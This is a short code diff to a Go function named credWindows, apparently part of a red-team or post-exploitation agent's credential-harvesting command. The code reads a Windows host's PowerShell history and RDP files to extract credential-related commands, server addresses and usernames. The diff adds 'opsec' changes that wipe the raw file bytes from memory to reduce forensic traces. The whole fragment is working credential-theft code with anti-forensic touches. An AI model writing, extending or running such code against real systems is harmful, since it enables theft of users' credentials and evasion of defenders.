@@ -49,7 +49,9 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", psHistoryPath, info.Size()))
 
 		if data, err := os.ReadFile(psHistoryPath); err == nil {
-			lines := strings.Split(strings.TrimRight(string(data), "\r\n"), "\n")
+			content := string(data)
+			structs.ZeroBytes(data) // opsec: clear raw history bytes from memory
+			lines := strings.Split(strings.TrimRight(content, "\r\n"), "\n")
 			// Show last 50 lines, highlight credential-related commands
 			start := 0
 			if len(lines) > 50 {
@@ -85,7 +87,9 @@ func credWindows(args credHarvestArgs) structs.CommandResult {
 			rdpFound = true
 			sb.WriteString(fmt.Sprintf("  [FILE] %s (%d bytes)\n", rdpPath, info.Size()))
 			if data, err := os.ReadFile(rdpPath); err == nil {
-				for _, line := range strings.Split(string(data), "\n") {
+				rdpContent := string(data)
+				structs.ZeroBytes(data) // opsec: clear raw RDP data
+				for _, line := range strings.Split(rdpContent, "\n") {
 					line = strings.TrimRight(line, "\r")
 					if strings.HasPrefix(line, "full address") || strings.HasPrefix(line, "username") {
 						sb.WriteString(fmt.Sprintf("    %s\n", line))
